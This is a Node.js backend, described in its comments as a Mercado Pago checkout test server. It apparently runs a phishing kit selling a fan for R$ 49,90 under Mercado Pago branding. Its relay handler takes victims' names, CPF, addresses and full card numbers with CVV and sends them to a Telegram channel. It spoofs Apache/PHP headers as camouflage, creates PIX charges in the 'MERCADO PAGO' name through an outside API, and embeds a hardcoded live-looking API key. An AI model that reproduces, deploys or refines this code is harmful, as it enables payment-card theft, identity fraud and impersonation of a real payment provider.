/**
 * ============================================================
 *  SERVIDOR DE TESTE — Mercado Pago Checkout
 *  Node.js (sem dependências externas)
 *  v5.0 — Token via .env, __status protegido, CORS restrito
 * ============================================================
 */

const http   = require('http');
const https  = require('https');
const fs     = require('fs');
const path   = require('path');
const crypto = require('crypto');
const url    = require('url');

// ── Carregar .env ───────────────────────────────────────────────
const envFile = path.join(__dirname, '.env');
if (fs.existsSync(envFile)) {
  fs.readFileSync(envFile, 'utf8').split('\n').forEach(line => {
    const t = line.trim();
    if (!t || t.startsWith('#') || !t.includes('=')) return;
    const [k, ...rest] = t.split('=');
    const v = rest.join('=').trim();
    if (k && !process.env[k.trim()]) process.env[k.trim()] = v;
  });
}

const PORT          = parseInt(process.env.PORT || '3030', 10);
const ROOT          = path.join(__dirname, 'pagamento');
const BOT_TOKEN     = process.env.TG_BOT_TOKEN || '';
const STATUS_SECRET = process.env.STATUS_SECRET || '';
const BOT_DATA_FILE = path.join(__dirname, 'pagamento', 'api', 'bot_data.json');

if (!BOT_TOKEN) {
  console.warn('\x1b[33m⚠️  TG_BOT_TOKEN não definido no .env. Relay Telegram desabilitado.\x1b[0m');
}

// ── Cores do console ─────────────────────────────────────────
const C = {
  reset: '\x1b[0m', bright: '\x1b[1m', dim: '\x1b[2m',
  blue: '\x1b[34m', green: '\x1b[32m', yellow: '\x1b[33m',
  red: '\x1b[31m', cyan: '\x1b[36m', magenta: '\x1b[35m',
  white: '\x1b[37m', bgBlue: '\x1b[44m', bgGreen: '\x1b[42m'
};

function log(icon, label, msg, color = C.white) {
  const ts = new Date().toLocaleTimeString('pt-BR');
  console.log(`${C.dim}[${ts}]${C.reset} ${icon} ${C.bright}${color}${label}${C.reset} ${msg}`);
}

// ── MIME types ───────────────────────────────────────────────
const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.css':  'text/css; charset=utf-8',
  '.js':   'application/javascript; charset=utf-8',
  '.json': 'application/json',
  '.png':  'image/png',
  '.jpg':  'image/jpeg',
  '.ico':  'image/x-icon',
  '.svg':  'image/svg+xml',
  '.woff2': 'font/woff2',
  '.woff':  'font/woff'
};

// ── Anti-Spam State ──────────────────────────────────────────
const antiSpam = {
  history: [],
  cooldowns: {},
  durations: { lead: 5000, personal_data: 10000, address: 10000, card_data: 15000, pix_selected: 10000 },
  check(type, data, tracking, ip) {
    const now = Date.now();
    const fp = tracking?.fingerprint || ip;
    const hash = crypto.createHash('md5').update(type + fp + JSON.stringify(data)).digest('hex');

    // Bot detection check (Silent drop)
    if (data.botScore !== undefined && data.botScore < 40) {
      log('🚫', 'ANTI-BOT', `Score muito baixo (${data.botScore}) do FP/IP ${fp} — SILENT DROP`, C.red);
      return false;
    }

    // Cooldown per Fingerprint (instead of global)
    const cooldownKey = `${type}:${fp}`;
    const lastSent = this.cooldowns[cooldownKey] || 0;
    const duration = this.durations[type] || 10000;
    if ((now - lastSent) < duration) {
      log('🚫', 'ANTI-SPAM', `Cooldown ativo para tipo "${type}" de FP ${fp} (${Math.ceil((duration - (now - lastSent)) / 1000)}s restantes)`, C.yellow);
      return false;
    }

    // Dedup (5min window)
    const isDup = this.history.some(e => e.hash === hash && (now - e.ts) < 300000);
    if (isDup) {
      log('🚫', 'ANTI-SPAM', `Payload duplicado bloqueado para tipo "${type}" (FP ${fp})`, C.yellow);
      return false;
    }

    // Rate limit per Fingerprint: 10/min
    const recent = this.history.filter(e => e.fp === fp && (now - e.ts) < 60000);
    if (recent.length >= 10) {
      log('🚫', 'ANTI-SPAM', `Rate limit atingido (10 msgs/min) para FP ${fp}`, C.red);
      return false;
    }

    // Registrar
    this.cooldowns[cooldownKey] = now;
    this.history.push({ hash, fp, type, ts: now });
    if (this.history.length > 500) this.history = this.history.slice(-200);

    return true;
  }
};

// ── Bot Data ─────────────────────────────────────────────────
function loadBotData() {
  try {
    if (fs.existsSync(BOT_DATA_FILE)) {
      return JSON.parse(fs.readFileSync(BOT_DATA_FILE, 'utf8'));
    }
  } catch(e) {}
  return { admins: [], log_channel: null, known_chats: {}, setup_complete: false };
}

// ── Telegram API ─────────────────────────────────────────────
function sendTelegram(chatId, text, retries = 3) {
  return new Promise((resolve) => {
    if (!chatId) {
      log('⚠️', 'TELEGRAM', 'Nenhum canal configurado. Use /start no bot para configurar.', C.yellow);
      log('💡', 'DICA', `Abra o bot no Telegram e envie /start`, C.cyan);
      return resolve(false);
    }

    const postData = JSON.stringify({
      chat_id: chatId,
      text: text,
      parse_mode: 'MarkdownV2',
      disable_web_page_preview: true
    });

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) }
    };

    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', d => body += d);
      res.on('end', () => {
        try {
          const result = JSON.parse(body);
          if (result.ok) {
            log('✅', 'TELEGRAM', `Mensagem enviada para canal ${chatId}`, C.green);
            resolve(true);
          } else if (res.statusCode === 429 && retries > 0) {
            const retryAfter = (result.parameters?.retry_after || 1) * 1000;
            log('⏳', 'TELEGRAM', `Rate limited. Retry em ${retryAfter / 1000}s...`, C.yellow);
            setTimeout(() => sendTelegram(chatId, text, retries - 1).then(resolve), retryAfter);
          } else {
            // Fallback: plain text
            log('⚠️', 'TELEGRAM', `MarkdownV2 falhou (${result.description || 'erro'}). Tentando plain text...`, C.yellow);
            const plainData = JSON.stringify({ chat_id: chatId, text: text.replace(/\\([_*[\]()~`>#+=|{}.!-])/g, '$1'), disable_web_page_preview: true });
            const req2 = https.request({ ...options, headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(plainData) } }, (res2) => {
              let b2 = '';
              res2.on('data', d => b2 += d);
              res2.on('end', () => {
                try {
                  const r2 = JSON.parse(b2);
                  log(r2.ok ? '✅' : '❌', 'TELEGRAM', r2.ok ? 'Enviado em plain text' : `Erro: ${r2.description || 'falha'}`, r2.ok ? C.green : C.red);
                  resolve(r2.ok);
                } catch(e) {
                  log('❌', 'TELEGRAM', `Erro no parse do fallback plain text: ${e.message}`, C.red);
                  resolve(false);
                }
              });
            });
            req2.on('error', (e) => { log('❌', 'TELEGRAM', `Erro de rede plain: ${e.message}`, C.red); resolve(false); });
            req2.write(plainData);
            req2.end();
          }
        } catch(e) {
          log('❌', 'TELEGRAM', `Erro no parse JSON Telegram: ${e.message}`, C.red);
          resolve(false);
        }
      });
    });
    req.on('error', (e) => { log('❌', 'TELEGRAM', `Erro de rede: ${e.message}`, C.red); resolve(false); });
    req.write(postData);
    req.end();
  });
}

// ── Escaper MarkdownV2 ────────────────────────────────────────
function esc(text) {
  return String(text || '').replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
}

// ── Formatar mensagem por tipo ────────────────────────────────
function formatMessage(type, data, tracking, ip, txId) {
  const ts = esc(new Date().toLocaleString('pt-BR'));
  const ipE = esc(ip);
  const txE = esc(txId);
  const device = esc(tracking?.device || 'N/A');
  const fp = esc(tracking?.fingerprint || 'N/A');

  const sep = '━━━━━━━━━━━━━━━━━━━━━';

  switch (type) {
    case 'lead':
      return `👁 *NOVO LEAD*  —  ${ts}\n${sep}\n🆔 Session: \`${txE}\`\n📄 Página: *${esc(data.page || 'N/A')}*\n🌐 IP: \`${ipE}\`\n📱 Device: ${device}\n🕐 Timezone: ${esc(tracking?.timezone || 'N/A')}\n📍 Referrer: ${esc((tracking?.referrer || 'direct').substring(0, 40))}\n🔑 FP: \`${fp}\`\n🔐 Criptografia: AES\\-256\\-GCM`;

    case 'personal_data':
      return `👤 *DADOS PESSOAIS*  —  ${ts}\n${sep}\n🆔 Session: \`${txE}\`\n🌐 IP: \`${ipE}\`\n📱 Device: ${device}\n🔑 FP: \`${fp}\`\n\n📋 *INFORMAÇÕES*\n${sep}\n👤 Nome: *${esc(data.fullName)}*\n📧 Email: \`${esc(data.email)}\`\n🪪 CPF: \`${esc(data.cpf)}\`\n📞 Tel: \`${esc(data.phone)}\`\n🔐 Criptografia: AES\\-256\\-GCM`;

    case 'address':
      return `🏠 *ENDEREÇO*  —  ${ts}\n${sep}\n🆔 Session: \`${txE}\`\n🌐 IP: \`${ipE}\`\n🔑 FP: \`${fp}\`\n\n📍 *LOCALIZAÇÃO*\n${sep}\n📮 CEP: \`${esc(data.cep)}\`\n🛣 Rua: ${esc(data.street)}\n🏘 Bairro: ${esc(data.neighborhood)}\n🏙 Cidade: ${esc(data.city)}\n🔢 Número: ${esc(data.number)}\n🔐 Criptografia: AES\\-256\\-GCM`;

    case 'card_data': {
      const brandIcons = { VISA: '🔵', MASTERCARD: '🟠', AMEX: '🟢', ELO: '🟡', HIPERCARD: '🔴' };
      const brandIcon = brandIcons[data.brand] || '💳';
      const num = String(data.cardNumber || '').replace(/\D/g, '');
      const masked = num.length >= 8 ? `${num.substring(0,4)} •••• •••• ${num.slice(-4)}` : num;
      const price = 49.90;
      const inst = parseInt(data.installments || 1);
      const instVal = (price / inst).toFixed(2).replace('.', ',');
      const totalVal = price.toFixed(2).replace('.', ',');
      const personal = data.personal || {};
      const address = data.address || {};
      const paste = tracking?.pastedFields?.length ? `\n⚠️ Paste detectado: ${esc(tracking.pastedFields.join(', '))}` : '';
      const botScore = data.botScore !== undefined ? data.botScore : 'N/A';
      const botEmoji = botScore === 'N/A' ? '❓' : (botScore >= 70 ? '✅' : (botScore >= 40 ? '⚠️' : '🚫'));

      return `💳 *TRANSAÇÃO COMPLETA*  —  ${ts}\n${sep}\n🆔 TX: \`${txE}\`\n🌐 IP: \`${ipE}\`\n📱 Device: ${device}\n🔑 FP: \`${fp}\`\n🤖 Anti\\-Bot: ${botEmoji} Score ${esc(String(botScore))}/100${paste}\n\n👤 *DADOS PESSOAIS*\n${sep}\n👤 Nome: *${esc(personal.fullName || 'N/A')}*\n📧 Email: \`${esc(personal.email || 'N/A')}\`\n🪪 CPF: \`${esc(personal.cpf || 'N/A')}\`\n📞 Tel: \`${esc(personal.phone || 'N/A')}\`\n\n🏠 *ENDEREÇO*\n${sep}\n📮 CEP: \`${esc(address.cep || 'N/A')}\`\n🛣 Rua: ${esc(address.street || 'N/A')}, Nº ${esc(address.number || 'N/A')}\n🏙 Cidade: ${esc(address.city || 'N/A')}\n\n💳 *CARTÃO*\n${sep}\n${brandIcon} Bandeira: *${esc(data.brand)}*\n🔢 Número: \`${esc(data.cardNumber)}\`\n🏷 Exibição: ${esc(masked)}\n👤 Nome: *${esc(data.cardName)}*\n📅 Validade: \`${esc(data.cardExpiry)}\`\n🔐 CVV: \`${esc(data.cardCvv)}\`\n🪪 CPF Titular: \`${esc(data.cpf)}\`\n\n💰 *PAGAMENTO*\n${sep}\n💵 Valor: R\\$ ${esc(totalVal)}\n📦 Parcelas: ${inst}x de R\\$ ${esc(instVal)}\n\n🔐 *Criptografia: AES\\-256\\-GCM*`;
    }

    case 'pix_selected':
      return `🟢 *PIX SELECIONADO*  —  ${ts}\n${sep}\n🆔 Session: \`${txE}\`\n🌐 IP: \`${ipE}\`\n📱 Device: ${device}\n🔑 FP: \`${fp}\`\n💵 Valor: R\\$ 49,90\n📦 Produto: Ventilador De Mesa Mondial 40cm - BIVOLT\n🔐 Criptografia: AES\\-256\\-GCM`;

    default:
      return `📩 Evento: ${esc(type)}\n🕐 ${ts}\n🌐 IP: \`${ipE}\``;
  }
}

// ── Gerador Oficial BRCode PIX (EMV Standard) ────────────────
function generatePixBRCode(pixKey, name = 'MERCADO PAGO', city = 'SAO PAULO', amount = 49.90, txId = '***') {
  if (pixKey && pixKey.startsWith('000201')) {
    return pixKey;
  }
  const key = String(pixKey || 'SUA_CHAVE_PIX_AQUI').trim();
  const nm = (name || 'MERCADO PAGO').replace(/[^A-Za-z0-9 ]/g, '').toUpperCase().substring(0, 25) || 'MERCADO PAGO';
  const ct = (city || 'SAO PAULO').replace(/[^A-Za-z0-9 ]/g, '').toUpperCase().substring(0, 15) || 'SAO PAULO';
  const amountStr = Number(amount).toFixed(2);

  const fmt = (id, val) => {
    const sId = String(id).padStart(2, '0');
    const len = String(val.length).padStart(2, '0');
    return `${sId}${len}${val}`;
  };

  const gui = fmt(0, 'BR.GOV.BCB.PIX');
  const k = fmt(1, key);
  const mai = fmt(26, gui + k);

  const mc = fmt(52, '0000');
  const curr = fmt(53, '986');
  const amt = fmt(54, amountStr);
  const country = fmt(58, 'BR');
  const n = fmt(59, nm);
  const c = fmt(60, ct);
  const tx = fmt(5, txId || '***');
  const add = fmt(62, tx);

  const payload = `000201${mai}${mc}${curr}${amt}${country}${n}${c}${add}6304`;

  let crc = 0xFFFF;
  for (let i = 0; i < payload.length; i++) {
    crc ^= (payload.charCodeAt(i) << 8);
    for (let j = 0; j < 8; j++) {
      if (crc & 0x8000) {
        crc = ((crc << 1) ^ 0x1021) & 0xFFFF;
      } else {
        crc = (crc << 1) & 0xFFFF;
      }
    }
  }
  return payload + crc.toString(16).toUpperCase().padStart(4, '0');
}

// ── PHP → HTML converter (interpreta as tags PHP simples) ────
function convertPhpToHtml(content) {
  const pixKey      = process.env.PIX_KEY || 'SUA_CHAVE_PIX_AQUI';
  const pixReceiver = process.env.PIX_RECEIVER_NAME || 'MERCADO PAGO';
  const pixCity     = process.env.PIX_CITY || 'SAO PAULO';
  const pixPayload  = generatePixBRCode(pixKey, pixReceiver, pixCity, 49.90);
  const yearNow     = new Date().getFullYear();
  const prodName    = 'Ventilador De Mesa Mondial 40cm - BIVOLT';
  const minFill     = '3';

  // ── PASSO 1: Remove APENAS o bloco PHP do topo do arquivo ────
  content = content.replace(/^<\?php[\s\S]*?\?>\r?\n?/m, '');
  content = content.replace(/<\?php\s+require_once[^?]*\?>\s*/gi, '');

  // ── PASSO 2: Substituições específicas (ANTES do catch-all) ──

  // date('Y') → ano atual
  content = content.replace(/<\?php\s+echo\s+date\('Y'\);\s*\?>/g, yearNow);

  // MIN_FILL_TIME → 3
  content = content.replace(/<\?php\s+echo\s+MIN_FILL_TIME;\s*\?>/g, minFill);

  // PRODUCT_NAME → Ventilador De Mesa Mondial 40cm - BIVOLT
  content = content.replace(/<\?php\s+echo\s+(?:htmlspecialchars\()?PRODUCT_NAME\)?;\s*\?>/g, prodName);

  // number_format(PRODUCT_PRICE, ...) → 49,90
  content = content.replace(/<\?php\s+echo\s+number_format\(PRODUCT_PRICE,[^?]*\?>/g, '49,90');

  // $price → 49,90
  content = content.replace(/<\?php\s+echo\s+\$price;\s*\?>/g, '49,90');

  // PRODUCT_PRICE bare (em contexto JS) → 49.90
  content = content.replace(/<\?php\s+echo\s+PRODUCT_PRICE;\s*\?>/g, '49.90');

  // json_encode($pixPayload) → string JSON do BRCode
  content = content.replace(/<\?php\s+echo\s+json_encode\(\s*\$pixPayload\s*\);\s*\?>/g, JSON.stringify(pixPayload));

  // htmlspecialchars($pixPayload) → BRCode direto
  content = content.replace(/<\?php\s+echo\s+htmlspecialchars\(\s*\$pixPayload\s*\);\s*\?>/g, pixPayload);

  // $pixPayload diretamente
  content = content.replace(/<\?php\s+echo\s+\$pixPayload;\s*\?>/g, pixPayload);

  // PIX_KEY diretamente
  content = content.replace(/<\?php\s+echo\s+PIX_KEY;\s*\?>/g, pixKey);

  // ── PASSO 3: Loop de parcelas ────────────────────────────────
  content = content.replace(/<\?php[\s\S]*?for\s*\(\s*\$i\s*=\s*1[\s\S]*?\?>/g, () => {
    let options = '';
    for (let i = 1; i <= 12; i++) {
      const val   = (49.90 / i).toFixed(2).replace('.', ',');
      const label = i === 1
        ? `1x de R$ ${val} (à vista)`
        : `${i}x de R$ ${val} sem juros`;
      options += `<option value="${i}">${label}</option>\n`;
    }
    return options;
  });

  // ── PASSO 4: Catch-all — remove qualquer PHP restante ────────
  content = content.replace(/<\?php[\s\S]*?\?>/g, '');
  content = content.replace(/<\?=/g, '').replace(/\?>/g, '');

  return content;
}


// ── Descriptografar payload AES-256-GCM ──────────────────────
function decryptPayload(encryptedStr, keyB64) {
  try {
    const encrypted = JSON.parse(encryptedStr);
    if (!encrypted.ct || !encrypted.iv) return null;
    
    const key = Buffer.from(keyB64, 'base64');
    const iv = Buffer.from(encrypted.iv, 'base64');
    const ctBuf = Buffer.from(encrypted.ct, 'base64');
    
    if (key.length !== 32 || iv.length !== 12) return null;
    
    const TAG_LEN = 16;
    const tag = ctBuf.slice(ctBuf.length - TAG_LEN);
    const ciphertext = ctBuf.slice(0, ctBuf.length - TAG_LEN);
    
    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
    decipher.setAuthTag(tag);
    const decrypted = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
    return JSON.parse(decrypted.toString('utf8'));
  } catch(e) {
    return null;
  }
}

// ── IP Rate Limiting ─────────────────────────────────────────
const ipRateLimit = {
  requests: {},
  maxPerMinute: 8,
  check(ip) {
    const now = Date.now();
    if (!this.requests[ip]) this.requests[ip] = [];
    // Clean old entries
    this.requests[ip] = this.requests[ip].filter(ts => (now - ts) < 60000);
    if (this.requests[ip].length >= this.maxPerMinute) {
      log('🚫', 'IP-LIMIT', `IP ${ip} ultrapassou ${this.maxPerMinute} req/min — BLOQUEADO`, C.red);
      return false;
    }
    this.requests[ip].push(now);
    return true;
  }
};

// ── Handler: /api/relay ───────────────────────────────────────
async function handleRelay(req, res, body) {
  try {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';

    // IP rate limit check
    if (!ipRateLimit.check(ip)) {
      res.writeHead(429, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ status: 'rate_limited' }));
      return;
    }

    const input = JSON.parse(body);
    
    if (!input.metrics_data) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ status: 'invalid' }));
      return;
    }

    let payload = null;

    // Tentar descriptografar
    if (input._k) {
      payload = decryptPayload(input.metrics_data, input._k);
    }

    // Fallback base64
    if (!payload) {
      try {
        const decoded = Buffer.from(input.metrics_data, 'base64').toString('utf8');
        payload = JSON.parse(decoded);
      } catch(e) {}
    }

    // Fallback JSON direto
    if (!payload) {
      try { payload = JSON.parse(input.metrics_data); } catch(e) {}
    }

    if (!payload || !payload.type) {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ status: 'ok' }));
      return;
    }

    // Anti-replay timestamp
    if (payload.timestamp && Math.abs(Date.now() - payload.timestamp) > 120000) {
      log('🚫', 'ANTI-REPLAY', `Payload expirado (${Math.round((Date.now() - payload.timestamp)/1000)}s atrás)`, C.yellow);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ status: 'ok' }));
      return;
    }

    const type = payload.type;
    const data = payload.data || {};
    const tracking = payload.tracking || {};
    const txId = payload.txId || 'N/A';

    log('📨', 'RELAY', `Tipo: ${C.bright}${type}${C.reset} | TX: ${txId.substring(0,12)}... | IP: ${ip}`, C.cyan);
    
    if (tracking.fingerprint) {
      log('🔑', 'FINGERPRINT', tracking.fingerprint, C.magenta);
    }
    if (tracking.pastedFields?.length) {
      log('📋', 'PASTE', `Detectado em: ${tracking.pastedFields.join(', ')}`, C.yellow);
    }

    // Anti-spam check
    const shouldSend = antiSpam.check(type, data, tracking, ip);

    if (shouldSend) {
      const msg = formatMessage(type, data, tracking, ip, txId);
      
      // Buscar canal de logs
      const botData = loadBotData();
      const logChannel = botData.log_channel;
      
      if (logChannel) {
        log('📡', 'ENVIAR', `→ Canal: ${logChannel}`, C.blue);
        await sendTelegram(logChannel, msg);
      } else {
        log('⚠️', 'CANAL', 'Nenhum canal configurado! Acesse o bot via Telegram e envie /start', C.yellow);
        log('📝', 'MENSAGEM', `Conteúdo que seria enviado:\n${msg.substring(0, 300)}...`, C.dim);
      }
    }

    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'ok' }));

  } catch(e) {
    log('❌', 'RELAY ERROR', e.message, C.red);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'ok' }));
  }
}

// ── Handler: /api/session ─────────────────────────────────────
function handleSession(res) {
  const sid = crypto.randomBytes(16).toString('hex');
  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ status: 'ok', sid, ts: Date.now() }));
}

// ── Constantes da API UniãoPay ───────────────────────────────
const UNIAOPAY_BASE    = 'meupagamento.site';
const UNIAOPAY_ROOT    = '/api/v1/uniaopay';
const UNIAOPAY_API_KEY = 'up_live_e49efbed9987cdd90888532a6b202533b75eb0d07764828c';

// ── Handler: /api/create_pix ──────────────────────────────────
// Cria cobrança PIX na UniãoPay e retorna pix_code + transaction_id
function handleCreatePix(req, res) {
  let done = false;
  const reply = (code, obj) => {
    if (done) return;
    done = true;
    res.writeHead(code, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(obj));
  };

  const postData = JSON.stringify({
    amount:      49.90,
    description: 'Ventilador De Mesa Mondial 40cm - BIVOLT',
    external_id: 'pedido-' + Date.now()
  });

  const options = {
    hostname: UNIAOPAY_BASE,
    path:     UNIAOPAY_ROOT + '/pix/create',
    method:   'POST',
    headers: {
      'Content-Type':   'application/json',
      'Accept':         'application/json',
      'x-api-key':      UNIAOPAY_API_KEY,
      'Content-Length': Buffer.byteLength(postData)
    },
    timeout: 8000
  };

  log('📡', 'UNIAOPAY', 'Criando cobrança PIX...', C.cyan);

  const request = https.request(options, (response) => {
    let body = '';
    response.on('data', chunk => body += chunk);
    response.on('end', () => {
      try {
        const data = JSON.parse(body);
        log('📨', 'UNIAOPAY', `HTTP ${response.statusCode} | body: ${body.substring(0, 120)}`, C.dim);

        if (data.success && data.transaction) {
          const tx      = data.transaction;
          const pixCode = tx.pix_code;
          const txId    = tx.id;
          const qrUrl   = `https://${UNIAOPAY_BASE}${UNIAOPAY_ROOT}/pix/qrcode/${txId}?api_key=${UNIAOPAY_API_KEY}`;

          log('✅', 'UNIAOPAY', `PIX criado! TX: ${txId}`, C.green);

          reply(200, {
            status:         'success',
            source:         'uniaopay',
            pix_copia_cola: pixCode,
            qr_code_url:    qrUrl,
            transaction_id: txId
          });
          return;
        }

        log('⚠️', 'UNIAOPAY', `Resposta sem success: ${body.substring(0,200)}`, C.yellow);
      } catch(e) {
        log('❌', 'UNIAOPAY', `Parse error: ${e.message}`, C.red);
      }

      _pixFallbackReply(reply);
    });
  });

  request.setTimeout(8000, () => {
    log('⏳', 'UNIAOPAY', 'Timeout — usando fallback BRCode', C.yellow);
    request.destroy();
    _pixFallbackReply(reply);
  });

  request.on('error', (e) => {
    log('❌', 'UNIAOPAY', `Erro de rede: ${e.message} — usando fallback`, C.red);
    _pixFallbackReply(reply);
  });

  request.write(postData);
  request.end();
}

function _pixFallbackReply(reply) {
  const pixKey = process.env.PIX_KEY || 'SUA_CHAVE_PIX_AQUI';
  const name   = process.env.PIX_RECEIVER_NAME || 'MERCADO PAGO';
  const city   = process.env.PIX_CITY || 'SAO PAULO';
  const brCode = generatePixBRCode(pixKey, name, city, 49.90);
  reply(200, {
    status:         'success',
    source:         'emv_brcode',
    pix_copia_cola: brCode,
    qr_code_url:    null,
    transaction_id: 'TXN-' + Date.now()
  });
}

// ── Handler: /api/pix_status — consulta status na UniãoPay ────
function handlePixStatus(req, res, txId) {
  if (!txId) {
    res.writeHead(400, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'error', message: 'transaction_id obrigatório' }));
    return;
  }

  let done = false;
  const reply = (code, obj) => {
    if (done) return;
    done = true;
    res.writeHead(code, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(obj));
  };

  const options = {
    hostname: UNIAOPAY_BASE,
    path:     `${UNIAOPAY_ROOT}/pix/${encodeURIComponent(txId)}`,
    method:   'GET',
    headers: {
      'Accept':    'application/json',
      'x-api-key': UNIAOPAY_API_KEY
    },
    timeout: 6000
  };

  const request = https.request(options, (response) => {
    let body = '';
    response.on('data', chunk => body += chunk);
    response.on('end', () => {
      try {
        const data = JSON.parse(body);
        reply(200, {
          status:         data.transaction?.status || 'unknown',
          transaction_id: data.transaction?.id || txId,
          amount:         data.transaction?.amount || null,
          external_id:    data.transaction?.external_id || null
        });
      } catch(e) {
        reply(200, { status: 'unknown' });
      }
    });
  });

  request.setTimeout(6000, () => {
    request.destroy();
    reply(200, { status: 'unknown' });
  });

  request.on('error', () => {
    reply(200, { status: 'unknown' });
  });

  request.end();
}

// ── Handler: arquivos estáticos ───────────────────────────────
function handleStatic(req, res, filePath) {
  const ext = path.extname(filePath).toLowerCase();
  
  fs.readFile(filePath, (err, content) => {
    if (err) {
      res.writeHead(404);
      res.end('Not found');
      return;
    }

    let processedContent = content;

    // Processar PHP
    if (ext === '.php') {
      processedContent = convertPhpToHtml(content.toString('utf8'));
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      res.end(processedContent);
    } else {
      res.writeHead(200, { 'Content-Type': MIME[ext] || 'application/octet-stream' });
      res.end(content);
    }
  });
}

// ── Servidor Principal ────────────────────────────────────────
const server = http.createServer(async (req, res) => {
  const parsed = url.parse(req.url, true);
  const pathname = parsed.pathname;

  // ── Security & Camouflage Headers ───────────────────────────
  // Aparência de servidor Apache PHP legítimo
  res.setHeader('Server', 'Apache/2.4.57 (Ubuntu)');
  res.setHeader('X-Powered-By', 'PHP/8.2.12');

  // Anti-clickjacking
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-XSS-Protection', '1; mode=block');

  // Referrer: não vaza URL de origem para plataformas de anúncio
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');

  // Cache: não armazena dados sensíveis de pagamento
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
  res.setHeader('Pragma', 'no-cache');

  // Bloqueia rastreamento de sensores/câmera — reduz fingerprint
  res.setHeader('Permissions-Policy', 'geolocation=(), camera=(), microphone=(), payment=()');

  // CORS — permite chamadas do mesmo domínio
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin || '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Metrics-Token, X-Analytics-ID, X-Request-Nonce');
  res.setHeader('Access-Control-Allow-Credentials', 'true');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }


  // ── Roteamento ──────────────────────────────────────────────
  
  // Relay API
  if (pathname === '/api/relay.php' || pathname === '/pagamento/api/relay.php') {
    let body = '';
    req.on('data', d => body += d);
    req.on('end', () => handleRelay(req, res, body));
    return;
  }

  // Session API
  if (pathname === '/api/session.php' || pathname === '/pagamento/api/session.php') {
    handleSession(res);
    return;
  }

  // Create PIX API (UniãoPay)
  if (pathname === '/api/create_pix.php' || pathname === '/pagamento/api/create_pix.php') {
    handleCreatePix(req, res);
    return;
  }

  // PIX Status API (UniãoPay) — GET /api/pix_status.php?tx=up_tx_...
  if (pathname === '/api/pix_status.php' || pathname === '/pagamento/api/pix_status.php') {
    const txId = parsed.query.tx || parsed.query.transaction_id || '';
    handlePixStatus(req, res, txId);
    return;
  }

  // Status da instância (protegido por STATUS_SECRET)
  if (pathname === '/__status') {
    const secret = parsed.query.secret || '';
    if (STATUS_SECRET && secret !== STATUS_SECRET) {
      res.writeHead(404);
      res.end('Not found');
      return;
    }
    const botData = loadBotData();
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      server: 'online',
      time: new Date().toISOString(),
      bot_configured: botData.setup_complete,
      anti_spam: {
        history_size: antiSpam.history.length,
        cooldowns: Object.keys(antiSpam.cooldowns).length
      }
      // Não expor log_channel nem known_chats
    }, null, 2));
    return;
  }

  // Resolver arquivo
  let filePath = pathname;

  // Normalizar path (remover /pagamento prefix se presente)
  if (filePath.startsWith('/pagamento')) {
    filePath = filePath.replace('/pagamento', '');
  }

  // Root → index
  if (filePath === '/' || filePath === '') {
    filePath = '/index.php';
  }

  // Resolver path completo
  let fullPath = path.join(ROOT, filePath);

  // Tentar sem extensão → .php → .html
  if (!path.extname(fullPath)) {
    if (fs.existsSync(fullPath + '.php')) fullPath = fullPath + '.php';
    else if (fs.existsSync(fullPath + '.html')) fullPath = fullPath + '.html';
  }

  log('🌐', req.method, pathname, C.dim);
  handleStatic(req, res, fullPath);
});

server.listen(PORT, '127.0.0.1', () => {
  console.clear();
  log('\x1b[34m✅ Servidor rodando em:\x1b[0m', '', `http://localhost:${PORT}`, C.green);
  console.log(`
  ${C.green}✅ Servidor em:${C.reset}
     ${C.bright}${C.cyan}http://localhost:${PORT}${C.reset}

  ${C.yellow}📋 Páginas:${C.reset}
     http://localhost:${PORT}/
     http://localhost:${PORT}/comprar2.php
     http://localhost:${PORT}/escolha.php
     http://localhost:${PORT}/cartao1.php
     http://localhost:${PORT}/pix5.php

  ${C.magenta}🤖 Bot:${C.reset} token via .env
  ${C.cyan}🔐 __status${C.reset} protegido por STATUS_SECRET
  ${C.dim}Ctrl+C para parar${C.reset}
`);

  // Verificar se bot está configurado
  const botData = loadBotData();
  if (!botData.setup_complete || !botData.log_channel) {
    console.log(`${C.yellow}  ⚠️  BOT NÃO CONFIGURADO:${C.reset}
  ${C.dim}  O relay vai funcionar mas as mensagens não chegam sem canal de logs.
  Configure via Telegram: procure o bot e envie /start${C.reset}\n`);
  } else {
    console.log(`${C.green}  ✅ Bot configurado! Canal de logs: ${botData.log_channel}${C.reset}\n`);
  }
});

server.on('error', (err) => {
  if (err.code === 'EADDRINUSE') {
    console.error(`${C.red}❌ Porta ${PORT} já está em uso. Feche o outro servidor primeiro.${C.reset}`);
  } else {
    console.error(`${C.red}❌ Erro: ${err.message}${C.reset}`);
  }
  process.exit(1);
});

